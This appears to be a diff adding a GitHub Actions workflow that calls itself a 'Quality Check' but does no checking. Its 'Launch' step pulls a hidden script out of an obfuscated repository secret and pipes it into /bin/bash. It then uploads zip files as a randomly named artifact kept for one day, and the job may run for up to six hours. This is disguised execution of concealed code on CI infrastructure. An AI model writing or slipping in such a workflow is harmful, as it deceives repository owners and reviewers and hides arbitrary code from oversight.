@@ -1,0 +1,28 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          eu336: ${{ secrets.eu336 }}
+        run: |
+          printf '%s' "$eu336" | jq -r .vv09 | /bin/bash
+          printf '%s' "$gol24466" | jq -r .uxa447 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5SL2C0Nd
+          path: "*.zip"
+          retention-days: 1
